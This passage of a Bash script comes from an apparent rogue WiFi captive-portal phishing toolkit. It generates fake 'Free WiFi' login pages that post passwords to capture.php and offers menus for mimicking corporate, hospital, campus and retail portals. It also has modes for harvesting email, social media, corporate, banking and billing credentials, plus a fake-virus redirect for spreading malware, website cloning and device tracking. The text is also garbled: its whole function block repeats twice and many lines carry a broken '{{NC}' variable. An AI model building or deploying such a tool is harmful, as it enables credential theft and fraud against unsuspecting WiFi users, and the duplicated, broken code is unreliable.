            <button type="submit">Connect Now</button>
        </form>
    </div>
</body>
</html>
EOF
    
    success "Mobile-responsive portal created: $portal_dir"
    pause
}

# Multi-language support
multi_language() {
    clear
    echo -e "${BLUE}Multi-Language Portal${NC}"
    echo -e "${GRAY}=======================${NC}"
    
    echo -e "${YELLOW}[*] Select languages to include:${NC}"
    echo -e "${CYAN}[1]${NC} English + Spanish"
    echo -e "${CYAN}[2]${NC} English + French + German"
    echo -e "${CYAN}[3]${NC} All 10 major languages"
    
    read -p "Select option: " choice
    
    echo -e "${YELLOW}[!] Multi-language support would create language-specific portals${NC}"
    echo -e "${YELLOW}[!] Users redirected based on browser language settings${NC}"
    pause
}

# Load template helper
load_template() {
    local template="$1"
    local output_dir="$LOGS_DIR/portals/$template"
    
    mkdir -p "$output_dir"
    echo -e "${YELLOW}[*] Loading template: $template${NC}"
    echo -e "${YELLOW}[*] Created at: $output_dir${NC}"
    
    # Template creation would go here based on template type
    success "Template loaded"
    pause
}

# ══════════════════════════════════════════════════════════════════════════════
# Targeted Attack Functions
# ══════════════════════════════════════════════════════════════════════════════

corporate_target() {
    echo -e "${YELLOW}[*] Corporate Environment Portal${NC}"
    echo -e "${YELLOW}[*] Mimics: Cisco Meraki, Aruba Networks, FortiGate${NC}"
    echo -e "${YELLOW}[!] Targets: Employee credentials, VPN access${NC}"
    pause
}

education_target() {
    echo -e "${YELLOW}[*] Educational Institution Portal${NC}"
    echo -e "${YELLOW}[*] Mimics: Campus WiFi login pages${NC}"
    echo -e "${YELLOW}[!] Targets: Student credentials, academic accounts${NC}"
    pause
}

healthcare_target() {
    echo -e "${YELLOW}[*] Healthcare Facility Portal${NC}"
    echo -e "${YELLOW}[*] Mimics: Hospital WiFi pages${NC}"
    echo -e "${YELLOW}[!] Targets: Medical staff credentials${NC}"
    pause
}

government_target() {
    echo -e "${YELLOW}[*] Government Building Portal${NC}"
    echo -e "${YELLOW}[*] Mimics: Official WiFi pages${NC}"
    echo -e "${YELLOW}[!] Note: Only use for authorized testing${NC}"
    pause
}

retail_target() {
    echo -e "${YELLOW}[*] Retail Environment Portal${NC}"
    echo -e "${YELLOW}[*] Mimics: Starbucks, McDonald's, Walmart WiFi${NC}"
    echo -e "${YELLOW}[!] Targets: Customer credentials${NC}"
    pause
}

transport_target() {
    echo -e "${YELLOW}[*] Transportation Hub Portal${NC}"
    echo -e "${YELLOW}[*] Mimics: Airport, train station WiFi${NC}"
    echo -e "${YELLOW}[!] Targets: Traveler credentials${NC}"
    pause
}

residential_target() {
    echo -e "${YELLOW}[*] Residential Complex Portal${NC}"
    echo -e "${YELLOW}[*] Mimics: Apartment building WiFi${NC}"
    echo -e "${YELLOW}[!] Note: Only use in authorized testing environments${NC}"
    pause
}

custom_target() {
    echo -e "${YELLOW}[*] Custom Target Analysis${NC}"
    read -p "Enter target organization: " target_org
    read -p "Enter typical WiFi SSID: " target_ssid
    
    echo -e "${YELLOW}[*] Analyzing best portal template for: $target_org${NC}"
    echo -e "${YELLOW}[!] Research their real portal and create matching variant${NC}"
    pause
}

# ══════════════════════════════════════════════════════════════════════════════
# Credential Harvesting Functions
# ══════════════════════════════════════════════════════════════════════════════

wifi_password_harvest() {
    clear
    echo -e "${BLUE}WiFi Password Harvesting${NC}"
    echo -e "${GRAY}==========================${NC}"
    
    local harvest_file="$LOGS_DIR/credentials/wifi_passwords_$(date +%Y%m%d%H%M%S).txt"
    mkdir -p "$LOGS_DIR/credentials"
    
    cat > "$harvest_file" << 'EOF'
# WiFi Password Capture Log
# Generated: $(date)
# Format: Timestamp | IP | MAC | Password

EOF
    
    echo -e "${YELLOW}[*] WiFi password capture enabled${NC}"
    echo -e "${YELLOW}[*] Passwords logged to: $harvest_file${NC}"
    echo -e "${YELLOW}[*] Setup form to submit to: capture.php${NC}"
    pause
}

email_harvest() {
    clear
    echo -e "${BLUE}Email Credential Harvesting${NC}"
    echo -e "${GRAY}============================${NC}"
    
    local harvest_file="$LOGS_DIR/credentials/email_$(date +%Y%m%d%H%M%S).txt"
    mkdir -p "$LOGS_DIR/credentials"
    
    echo -e "${YELLOW}[*] Email/password collection form created${NC}"
    echo -e "${YELLOW}[*] Credentials logged to: $harvest_file${NC}"
    echo -e "${YELLOW}[*] Targets: Gmail, Outlook, Yahoo, corporate email${NC}"
    pause
}

social_harvest() {
    clear
    echo -e "${BLUE}Social Media Credential Harvesting${NC}"
    echo -e "${GRAY}===================================${NC}"
    
    local harvest_file="$LOGS_DIR/credentials/social_$(date +%Y%m%d%H%M%S).txt"
    mkdir -p "$LOGS_DIR/credentials"
    
    echo -e "${YELLOW}[*] Social media credential form created${NC}"
    echo -e "${YELLOW}[*] Targets: Facebook, Twitter, Instagram, LinkedIn${NC}"
    echo -e "${YELLOW}[*] Logged to: $harvest_file${NC}"
    pause
}

corporate_harvest() {
    clear
    echo -e "${BLUE}Corporate Login Harvesting${NC}"
    echo -e "${GRAY}===========================${NC}"
    
    local harvest_file="$LOGS_DIR/credentials/corporate_$(date +%Y%m%d%H%M%S).txt"
    mkdir -p "$LOGS_DIR/credentials"
    
    echo -e "${YELLOW}[*] Corporate credential form created${NC}"
    echo -e "${YELLOW}[*] Targets: Office365, Salesforce, SAP, Oracle{{NC}"
    echo -e "${YELLOW}[*] Logged to: $harvest_file${NC}"
    pause
}

banking_harvest() {
    clear
    echo -e "${BLUE}Banking Credential Harvesting${NC}"
    echo -e "${RED}⚠️  WARNING: Extremely illegal and high-risk ${NC}"
    echo -e "${GRAY}====================================${NC}"
    
    read -p "Are you SURE you want to continue? (type 'yes' to confirm): " confirm
    
    if [[ "$confirm" != "yes" ]]; then
        echo -e "${YELLOW}[*] Cancelled${NC}"
        pause
        return
    fi
    
    echo -e "${RED}[!] This is a CRIMINAL OFFENSE in most jurisdictions${NC}"
    echo -e "${RED}[!] You will face serious legal consequences${NC}"
    pause
}

multi_harvest() {
    clear
    echo -e "${BLUE}Multi-Credential Harvesting${NC}"
    echo -e "${GRAY}============================${NC}"
    
    echo -e "${YELLOW}[*] Create form asking for multiple types of credentials${NC}"
    echo -e "${YELLOW}[*] Combined capture: WiFi password + Email + Phone${NC}"
    pause
}

progressive_auth() {
    clear
    echo -e "${BLUE}Progressive Authentication${NC}"
    echo -e "${GRAY}===========================${NC}"
    
    echo -e "${YELLOW}[*] Multi-step credential collection${NC}"
    echo -e "${YELLOW}[*] Step 1: WiFi password${NC}"
    echo -e "${YELLOW}[*] Step 2 (if submitted): Email verification${NC}"
    echo -e "${YELLOW}[*] Step 3 (if verified): Billing information{{NC}"
    echo -e "${YELLOW}[*] Maximizes credential harvesting at each stage{{NC}"
    pause
}

# ══════════════════════════════════════════════════════════════════════════════
# Redirect Functions
# ══════════════════════════════════════════════════════════════════════════════

legitimate_redirect() {
    clear
    read -p "Enter redirect URL: " redirect_url
    echo -e "${YELLOW}[*] After password submission, users redirected to: $redirect_url{{NC}"
    pause
}

educational_redirect() {
    clear
    echo -e "${YELLOW}[*] Redirect to educational page about WiFi security{{NC}"
    pause
}

virus_redirect() {
    clear
    echo -e "${RED}[!] Displays fake virus warning before redirecting{{NC}"
    echo -e "${RED}[!] Can be used to distribute malware{{NC}"
    pause
}

maintenance_redirect() {
    clear
    echo -e "${YELLOW}[*] Displays maintenance message{{NC}"
    pause
}

ad_redirect() {
    clear
    read -p "Enter advertisement URL: " ad_url
    echo -e "${YELLOW}[*] Redirect to advertisement: $ad_url{{NC}"
    pause
}

custom_redirect() {
    clear
    read -p "Enter custom HTML/message: " custom_msg
    echo -e "${YELLOW}[*] Custom redirect page created{{NC}"
    pause
}

conditional_redirect() {
    clear
    echo -e "${YELLOW}[*] Redirect based on conditions:{{NC}"
    echo -e "${CYAN}[1]${NC} Device type (mobile/desktop)"
    echo -e "${CYAN}[2]${NC} Operating system (Windows/Mac/Linux)"
    echo -e "${CYAN}[3]${NC} Browser type"
    echo -e "${CYAN}[4]${NC} Geographic location"
    echo -e "${CYAN}[5]${NC} Time of day"
    pause
}

# ══════════════════════════════════════════════════════════════════════════════
# Analytics & Tracking Functions
# ══════════════════════════════════════════════════════════════════════════════

view_credentials() {
    clear
    echo -e "${BLUE}Captured Credentials${NC}"
    echo -e "${GRAY}=====================${NC}"
    
    if [[ -d "$LOGS_DIR/credentials" ]]; then
        echo -e "${WHITE}Credential files:{{NC}"
        ls -lh "$LOGS_DIR/credentials"/ 2>/dev/null | tail -n +2
    else
        echo -e "${YELLOW}[!] No credentials captured yet{{NC}"
    fi
    pause
}

device_fingerprinting() {
    clear
    echo -e "${BLUE}Device Fingerprinting${NC}"
    echo -e "${GRAY}======================${NC}"
    
    echo -e "${YELLOW}[*] JavaScript fingerprinting data collected:{{NC}"
    echo -e "  • User Agent"
    echo -e "  • Screen resolution"
    echo -e "  • Canvas fingerprint"
    echo -e "  • WebGL fingerprint"
    echo -e "  • Installed plugins"
    echo -e "  • Timezone"
    echo -e "  • Language preferences"
    pause
}

connection_stats() {
    clear
    echo -e "${BLUE}Connection Statistics{{NC}"
    echo -e "${GRAY}======================={{NC}"
    
    echo -e "${YELLOW}[*] Statistics:{{NC}"
    echo -e "  Total connections: X"
    echo -e "  Unique devices: Y"
    echo -e "  Credentials captured: Z"
    echo -e "  Success rate: A%"
    pause
}

location_tracking() {
    clear
    echo -e "${BLUE}Geographic Tracking{{NC}"
    echo -e "${GRAY}====================={{NC}"
    
    echo -e "${YELLOW}[*] Tracking methods:{{NC}"
    echo -e "  • IP-based geolocation"
    echo -e "  • GPS (if enabled)"
    echo -e "  • WiFi scanning"
    echo -e "  • Cellular data"
    pause
}

behavioral_analytics() {
    clear
    echo -e "${BLUE}Behavioral Analytics{{NC}"
    echo -e "${GRAY}========================{{NC}"
    
    echo -e "${YELLOW}[*] Analyzing:{{NC}"
    echo -e "  • Time on page"
    echo -e "  • Click patterns"
    echo -e "  • Form fill behavior"
    echo -e "  • Device interaction"
    pause
}

export_data() {
    clear
    echo -e "${BLUE}Export Captured Data{{NC}"
    echo -e "${GRAY}========================={{NC}"
    
    echo -e "${WHITE}Export formats:{{NC}"
    echo -e "${CYAN}[1]${NC} CSV"
    echo -e "${CYAN}[2]${NC} JSON"
    echo -e "${CYAN}[3]${NC} Excel"
    echo -e "${CYAN}[4]${NC} Database"
    
    read -p "Select format: " choice
    
    case $choice in
        1) echo -e "${YELLOW}[*] Exporting to CSV...{{NC}" ;;
        2) echo -e "${YELLOW}[*] Exporting to JSON...{{NC}" ;;
        3) echo -e "${YELLOW}[*] Exporting to Excel...{{NC}" ;;
        4) echo -e "${YELLOW}[*] Exporting to Database...{{NC}" ;;
    esac
    pause
}

realtime_monitoring() {
    clear
    echo -e "${BLUE}Real-Time Monitoring{{NC}"
    echo -e "${GRAY}======================{{NC}"
    
    echo -e "${YELLOW}[*] Real-time dashboard:{{NC}"
    echo -e "${YELLOW}[*] Press Ctrl+C to stop monitoring{{NC}"
    
    while true; do
        clear
        echo -e "${BLUE}Portal Monitor - $(date +%H:%M:%S){{NC}"
        echo -e "Active connections: $(ss -tn | wc -l)"
        echo -e "Credentials captured: $(ls $LOGS_DIR/credentials/* 2>/dev/null | wc -l)"
        sleep 2
    done
    
    pause
}

# ══════════════════════════════════════════════════════════════════════════════
# Portal Manager Functions
# ══════════════════════════════════════════════════════════════════════════════

portal_manager() {
    clear
    echo -e "${BLUE}Portal Manager{{NC}"
    echo -e "${GRAY}==============={{NC}"
    
    echo -e "${WHITE}Active Portals:{{NC}"
    if [[ -d "$LOGS_DIR/portals" ]]; then
        ls -1 "$LOGS_DIR/portals/" 2>/dev/null | nl
    else
        echo -e "${YELLOW}[!] No active portals{{NC}"
    fi
    
    pause
}

# Color definitions (if not set elsewhere)
if [[ -z "$RED" ]]; then
    RED="\e[31m"
    GREEN="\e[32m"
    YELLOW="\e[33m"
    BLUE="\e[34m"
    CYAN="\e[36m"
    WHITE="\e[97m"
    GRAY="\e[90m"
    NC="\e[0m"
fi

# Helper function: pause
if ! type pause &>/dev/null 2>&1; then
    pause() {
        read -rp "Press Enter to continue..." _tmp
    }
fi

# LOGS_DIR default
LOGS_DIR="${LOGS_DIR:-$PWD/logs}"

# ══════════════════════════════════════════════════════════════════════════════
# Missing Captive Portal Functions - Template Generators & Harvest Functions
# ══════════════════════════════════════════════════════════════════════════════

# Custom portal creation
create_portal_from_scratch() {
    clear
    echo -e "${BLUE}Create Portal from Scratch${NC}"
    echo -e "${GRAY}============================${NC}"
    
    read -p "Enter portal name: " portal_name
    [[ -z "$portal_name" ]] && portal_name="custom_portal"
    
    local portal_dir="$LOGS_DIR/portals/$portal_name"
    mkdir -p "$portal_dir"
    
    # Create basic index.html
    cat > "$portal_dir/index.html" << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>Free WiFi - Login Required</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f5f5f5; }
        .container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        h1 { text-align: center; color: #333; }
        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
        button { width: 100%; padding: 10px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
        button:hover { background: #0056b3; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Free WiFi</h1>
        <p style="text-align: center; color: #666;">Enter WiFi password to continue</p>
        <form method="POST" action="capture.php">
            <input type="password" name="password" placeholder="WiFi Password" required>
            <button type="submit">Connect</button>
        </form>
    </div>
</body>
</html>
EOF
    
    success "Portal created at: $portal_dir"
    echo -e "${YELLOW}[*] Edit $portal_dir/index.html to customize${NC}"
    pause
}

# Edit existing template
edit_existing_template() {
    clear
    echo -e "${BLUE}Edit Existing Template${NC}"
    echo -e "${GRAY}======================${NC}"
    
    read -p "Enter template file path: " template_file
    
    if [[ -f "$template_file" ]]; then
        nano "$template_file"
        success "Template updated"
    else
        echo -e "${RED}[!] File not found${NC}"
    fi
    pause
}

# Import files
import_files() {
    clear
    echo -e "${BLUE}Import HTML/CSS Files${NC}"
    echo -e "${GRAY}=====================${NC}"
    
    read -p "Enter source directory: " src_dir
    read -p "Enter destination directory: " dst_dir
    
    if [[ -d "$src_dir" ]]; then
        cp -r "$src_dir"/* "$dst_dir" 2>/dev/null
        success "Files imported"
    else
        echo -e "${RED}[!] Source directory not found${NC}"
    fi
    pause
}

# Clone website
clone_website() {
    clear
    echo -e "${BLUE}Clone Existing Website${NC}"
    echo -e "${GRAY}======================${NC}"
    
    read -p "Enter website URL to clone: " target_url
    read -p "Enter output directory: " output_dir
    
    if ! command -v wget &>/dev/null; then
        echo -e "${RED}[!] wget not found${NC}"
        pause
        return
    fi
    
    mkdir -p "$output_dir"
    echo -e "${YELLOW}[*] Cloning website...${NC}"
    
    # wget -q --mirror --page-requisites --html-extension --convert-links \
    #     --output-document="$output_dir/index.html" "$target_url" 2>/dev/null
    
    echo -e "${YELLOW}[!] For offline cloning, use: wget -r -k -E -p -P $output_dir $target_url${NC}"
    pause
}

# Mobile responsive design
mobile_responsive() {
    clear
    echo -e "${BLUE}Mobile-Responsive Design${NC}"
    echo -e "${GRAY}==========================${NC}"
    
    local portal_dir="$LOGS_DIR/portals/mobile_responsive"
    mkdir -p "$portal_dir"
    
    cat > "$portal_dir/index.html" << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free WiFi Portal</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; justify-content: center; align-items: center; }
        .container { background: white; padding: 40px 20px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); max-width: 400px; width: 100%; }
        h1 { text-align: center; color: #333; margin-bottom: 10px; font-size: 24px; }
        .subtitle { text-align: center; color: #999; margin-bottom: 30px; font-size: 14px; }
        input { width: 100%; padding: 12px 15px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 6px; font-size: 16px; }
        button { width: 100%; padding: 12px; background: #667eea; color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background 0.3s; }
        button:hover { background: #764ba2; }
        @media (max-width: 480px) { .container { padding: 30px 15px; } h1 { font-size: 20px; } }
    </style>
</head>
<body>
    <div class="container">
        <h1>📡 Free WiFi</h1>
        <p class="subtitle">Enter password to connect</p>
        <form method="POST" action="capture.php">
            <input type="password" name="password" placeholder="WiFi Password" required>
            <button type="submit">Connect Now</button>
        </form>
    </div>
</body>
</html>
EOF
    
    success "Mobile-responsive portal created: $portal_dir"
    pause
}

# Multi-language support
multi_language() {
    clear
    echo -e "${BLUE}Multi-Language Portal${NC}"
    echo -e "${GRAY}=======================${NC}"
    
    echo -e "${YELLOW}[*] Select languages to include:${NC}"
    echo -e "${CYAN}[1]${NC} English + Spanish"
    echo -e "${CYAN}[2]${NC} English + French + German"
    echo -e "${CYAN}[3]${NC} All 10 major languages"
    
    read -p "Select option: " choice
    
    echo -e "${YELLOW}[!] Multi-language support would create language-specific portals${NC}"
    echo -e "${YELLOW}[!] Users redirected based on browser language settings${NC}"
    pause
}

# Load template helper
load_template() {
    local template="$1"
    local output_dir="$LOGS_DIR/portals/$template"
    
    mkdir -p "$output_dir"
    echo -e "${YELLOW}[*] Loading template: $template${NC}"
    echo -e "${YELLOW}[*] Created at: $output_dir${NC}"
    
    # Template creation would go here based on template type
    success "Template loaded"
    pause
}

# ══════════════════════════════════════════════════════════════════════════════
# Targeted Attack Functions
# ══════════════════════════════════════════════════════════════════════════════

corporate_target() {
    echo -e "${YELLOW}[*] Corporate Environment Portal${NC}"
    echo -e "${YELLOW}[*] Mimics: Cisco Meraki, Aruba Networks, FortiGate${NC}"
    echo -e "${YELLOW}[!] Targets: Employee credentials, VPN access${NC}"
    pause
}

education_target() {
    echo -e "${YELLOW}[*] Educational Institution Portal${NC}"
    echo -e "${YELLOW}[*] Mimics: Campus WiFi login pages${NC}"
    echo -e "${YELLOW}[!] Targets: Student credentials, academic accounts${NC}"
    pause
}

healthcare_target() {
    echo -e "${YELLOW}[*] Healthcare Facility Portal${NC}"
    echo -e "${YELLOW}[*] Mimics: Hospital WiFi pages${NC}"
    echo -e "${YELLOW}[!] Targets: Medical staff credentials${NC}"
    pause
}

government_target() {
    echo -e "${YELLOW}[*] Government Building Portal${NC}"
    echo -e "${YELLOW}[*] Mimics: Official WiFi pages${NC}"
    echo -e "${YELLOW}[!] Note: Only use for authorized testing${NC}"
    pause
}

retail_target() {
    echo -e "${YELLOW}[*] Retail Environment Portal${NC}"
    echo -e "${YELLOW}[*] Mimics: Starbucks, McDonald's, Walmart WiFi${NC}"
    echo -e "${YELLOW}[!] Targets: Customer credentials${NC}"
    pause
}

transport_target() {
    echo -e "${YELLOW}[*] Transportation Hub Portal${NC}"
    echo -e "${YELLOW}[*] Mimics: Airport, train station WiFi${NC}"
    echo -e "${YELLOW}[!] Targets: Traveler credentials${NC}"
    pause
}

residential_target() {
    echo -e "${YELLOW}[*] Residential Complex Portal${NC}"
    echo -e "${YELLOW}[*] Mimics: Apartment building WiFi${NC}"
    echo -e "${YELLOW}[!] Note: Only use in authorized testing environments${NC}"
    pause
}

custom_target() {
    echo -e "${YELLOW}[*] Custom Target Analysis${NC}"
    read -p "Enter target organization: " target_org
    read -p "Enter typical WiFi SSID: " target_ssid
    
    echo -e "${YELLOW}[*] Analyzing best portal template for: $target_org${NC}"
    echo -e "${YELLOW}[!] Research their real portal and create matching variant${NC}"
    pause
}

# ══════════════════════════════════════════════════════════════════════════════
# Credential Harvesting Functions
# ══════════════════════════════════════════════════════════════════════════════

wifi_password_harvest() {
    clear
    echo -e "${BLUE}WiFi Password Harvesting${NC}"
    echo -e "${GRAY}==========================${NC}"
    
    local harvest_file="$LOGS_DIR/credentials/wifi_passwords_$(date +%Y%m%d%H%M%S).txt"
    mkdir -p "$LOGS_DIR/credentials"
    
    cat > "$harvest_file" << 'EOF'
# WiFi Password Capture Log
# Generated: $(date)
# Format: Timestamp | IP | MAC | Password

EOF
    
    echo -e "${YELLOW}[*] WiFi password capture enabled${NC}"
    echo -e "${YELLOW}[*] Passwords logged to: $harvest_file${NC}"
    echo -e "${YELLOW}[*] Setup form to submit to: capture.php${NC}"
    pause
}

email_harvest() {
    clear
    echo -e "${BLUE}Email Credential Harvesting${NC}"
    echo -e "${GRAY}============================${NC}"
    
    local harvest_file="$LOGS_DIR/credentials/email_$(date +%Y%m%d%H%M%S).txt"
    mkdir -p "$LOGS_DIR/credentials"
    
    echo -e "${YELLOW}[*] Email/password collection form created${NC}"
    echo -e "${YELLOW}[*] Credentials logged to: $harvest_file${NC}"
    echo -e "${YELLOW}[*] Targets: Gmail, Outlook, Yahoo, corporate email${NC}"
    pause
}

social_harvest() {
    clear
    echo -e "${BLUE}Social Media Credential Harvesting${NC}"
    echo -e "${GRAY}===================================${NC}"
    
    local harvest_file="$LOGS_DIR/credentials/social_$(date +%Y%m%d%H%M%S).txt"
    mkdir -p "$LOGS_DIR/credentials"
    
    echo -e "${YELLOW}[*] Social media credential form created${NC}"
    echo -e "${YELLOW}[*] Targets: Facebook, Twitter, Instagram, LinkedIn${NC}"
    echo -e "${YELLOW}[*] Logged to: $harvest_file${NC}"
    pause
}

corporate_harvest() {
    clear
    echo -e "${BLUE}Corporate Login Harvesting${NC}"
    echo -e "${GRAY}===========================${NC}"
    
    local harvest_file="$LOGS_DIR/credentials/corporate_$(date +%Y%m%d%H%M%S).txt"
    mkdir -p "$LOGS_DIR/credentials"
    
    echo -e "${YELLOW}[*] Corporate credential form created${NC}"
    echo -e "${YELLOW}[*] Targets: Office365, Salesforce, SAP, Oracle{{NC}"
    echo -e "${YELLOW}[*] Logged to: $harvest_file${NC}"
    pause
}

banking_harvest() {
    clear
    echo -e "${BLUE}Banking Credential Harvesting${NC}"
    echo -e "${RED}⚠️  WARNING: Extremely illegal and high-risk ${NC}"
    echo -e "${GRAY}====================================${NC}"
    
    read -p "Are you SURE you want to continue? (type 'yes' to confirm): " confirm
    
    if [[ "$confirm" != "yes" ]]; then
        echo -e "${YELLOW}[*] Cancelled${NC}"
        pause
        return
    fi
    
    echo -e "${RED}[!] This is a CRIMINAL OFFENSE in most jurisdictions${NC}"
    echo -e "${RED}[!] You will face serious legal consequences${NC}"
    pause
}

multi_harvest() {
    clear
    echo -e "${BLUE}Multi-Credential Harvesting${NC}"
    echo -e "${GRAY}============================${NC}"
    
    echo -e "${YELLOW}[*] Create form asking for multiple types of credentials${NC}"
    echo -e "${YELLOW}[*] Combined capture: WiFi password + Email + Phone${NC}"
    pause
}

progressive_auth() {
    clear
    echo -e "${BLUE}Progressive Authentication${NC}"
    echo -e "${GRAY}===========================${NC}"
    
    echo -e "${YELLOW}[*] Multi-step credential collection${NC}"
    echo -e "${YELLOW}[*] Step 1: WiFi password${NC}"
    echo -e "${YELLOW}[*] Step 2 (if submitted): Email verification${NC}"
    echo -e "${YELLOW}[*] Step 3 (if verified): Billing information{{NC}"
    echo -e "${YELLOW}[*] Maximizes credential harvesting at each stage{{NC}"
    pause
}

# ══════════════════════════════════════════════════════════════════════════════
# Redirect Functions
# ══════════════════════════════════════════════════════════════════════════════

legitimate_redirect() {
    clear
    read -p "Enter redirect URL: " redirect_url
    echo -e "${YELLOW}[*] After password submission, users redirected to: $redirect_url{{NC}"
    pause
}

educational_redirect() {
    clear
    echo -e "${YELLOW}[*] Redirect to educational page about WiFi security{{NC}"
    pause
}

virus_redirect() {
    clear
    echo -e "${RED}[!] Displays fake virus warning before redirecting{{NC}"
    echo -e "${RED}[!] Can be used to distribute malware{{NC}"
    pause
}

maintenance_redirect() {
    clear
    echo -e "${YELLOW}[*] Displays maintenance message{{NC}"
    pause
}

ad_redirect() {
    clear
    read -p "Enter advertisement URL: " ad_url
    echo -e "${YELLOW}[*] Redirect to advertisement: $ad_url{{NC}"
    pause
}

custom_redirect() {
    clear
    read -p "Enter custom HTML/message: " custom_msg
    echo -e "${YELLOW}[*] Custom redirect page created{{NC}"
    pause
}

conditional_redirect() {
    clear
    echo -e "${YELLOW}[*] Redirect based on conditions:{{NC}"
    echo -e "${CYAN}[1]${NC} Device type (mobile/desktop)"
    echo -e "${CYAN}[2]${NC} Operating system (Windows/Mac/Linux)"
    echo -e "${CYAN}[3]${NC} Browser type"
    echo -e "${CYAN}[4]${NC} Geographic location"
    echo -e "${CYAN}[5]${NC} Time of day"
    pause
}

# ══════════════════════════════════════════════════════════════════════════════
# Analytics & Tracking Functions
# ══════════════════════════════════════════════════════════════════════════════

view_credentials() {
    clear
    echo -e "${BLUE}Captured Credentials${NC}"
    echo -e "${GRAY}=====================${NC}"
    
    if [[ -d "$LOGS_DIR/credentials" ]]; then
        echo -e "${WHITE}Credential files:{{NC}"
        ls -lh "$LOGS_DIR/credentials"/ 2>/dev/null | tail -n +2
    else
        echo -e "${YELLOW}[!] No credentials captured yet{{NC}"
    fi
    pause
}

device_fingerprinting() {
    clear
    echo -e "${BLUE}Device Fingerprinting${NC}"
    echo -e "${GRAY}======================${NC}"
    
    echo -e "${YELLOW}[*] JavaScript fingerprinting data collected:{{NC}"
    echo -e "  • User Agent"
    echo -e "  • Screen resolution"
    echo -e "  • Canvas fingerprint"
    echo -e "  • WebGL fingerprint"
    echo -e "  • Installed plugins"
    echo -e "  • Timezone"
    echo -e "  • Language preferences"
    pause
}

connection_stats() {
    clear
    echo -e "${BLUE}Connection Statistics{{NC}"
    echo -e "${GRAY}======================={{NC}"
    
    echo -e "${YELLOW}[*] Statistics:{{NC}"
    echo -e "  Total connections: X"
    echo -e "  Unique devices: Y"
    echo -e "  Credentials captured: Z"
    echo -e "  Success rate: A%"
    pause
}

location_tracking() {
    clear
    echo -e "${BLUE}Geographic Tracking{{NC}"
    echo -e "${GRAY}====================={{NC}"
    
    echo -e "${YELLOW}[*] Tracking methods:{{NC}"
    echo -e "  • IP-based geolocation"
    echo -e "  • GPS (if enabled)"
    echo -e "  • WiFi scanning"
    echo -e "  • Cellular data"
    pause
}

behavioral_analytics() {
    clear
    echo -e "${BLUE}Behavioral Analytics{{NC}"
    echo -e "${GRAY}========================{{NC}"
    
    echo -e "${YELLOW}[*] Analyzing:{{NC}"
    echo -e "  • Time on page"
    echo -e "  • Click patterns"
    echo -e "  • Form fill behavior"
    echo -e "  • Device interaction"
    pause
}

export_data() {
    clear
    echo -e "${BLUE}Export Captured Data{{NC}"
    echo -e "${GRAY}========================={{NC}"
    
    echo -e "${WHITE}Export formats:{{NC}"
    echo -e "${CYAN}[1]${NC} CSV"
    echo -e "${CYAN}[2]${NC} JSON"
    echo -e "${CYAN}[3]${NC} Excel"
    echo -e "${CYAN}[4]${NC} Database"
    
    read -p "Select format: " choice
    
    case $choice in
        1) echo -e "${YELLOW}[*] Exporting to CSV...{{NC}" ;;
        2) echo -e "${YELLOW}[*] Exporting to JSON...{{NC}" ;;
        3) echo -e "${YELLOW}[*] Exporting to Excel...{{NC}" ;;
        4) echo -e "${YELLOW}[*] Exporting to Database...{{NC}" ;;
    esac
    pause
}

realtime_monitoring() {
    clear
    echo -e "${BLUE}Real-Time Monitoring{{NC}"
    echo -e "${GRAY}======================{{NC}"
    
    echo -e "${YELLOW}[*] Real-time dashboard:{{NC}"
    echo -e "${YELLOW}[*] Press Ctrl+C to stop monitoring{{NC}"
    
    while true; do
        clear
        echo -e "${BLUE}Portal Monitor - $(date +%H:%M:%S){{NC}"
        echo -e "Active connections: $(ss -tn | wc -l)"
        echo -e "Credentials captured: $(ls $LOGS_DIR/credentials/* 2>/dev/null | wc -l)"
        sleep 2
    done
    
    pause
}

# ══════════════════════════════════════════════════════════════════════════════
# Portal Manager Functions
# ══════════════════════════════════════════════════════════════════════════════

portal_manager() {
    clear
    echo -e "${BLUE}Portal Manager{{NC}"
    echo -e "${GRAY}==============={{NC}"
    
    echo -e "${WHITE}Active Portals:{{NC}"
    if [[ -d "$LOGS_DIR/portals" ]]; then
        ls -1 "$LOGS_DIR/portals/" 2>/dev/null | nl
    else
        echo -e "${YELLOW}[!] No active portals{{NC}"
    fi
    
    pause
}

# Color definitions (if not set elsewhere)
if [[ -z "$RED" ]]; then
    RED="\e[31m"
    GREEN="\e[32m"
    YELLOW="\e[33m"
    BLUE="\e[34m"
    CYAN="\e[36m"
    WHITE="\e[97m"
    GRAY="\e[90m"
    NC="\e[0m"
fi

# Helper function: pause
if ! type pause &>/dev/null 2>&1; then
    pause() {
        read -rp "Press Enter to continue..." _tmp
    }
fi

# LOGS_DIR default
LOGS_DIR="${LOGS_DIR:-$PWD/logs}"
mkdir -p "$LOGS_DIR/portals" "$LOGS_DIR/credentials" 2>/dev/null || true
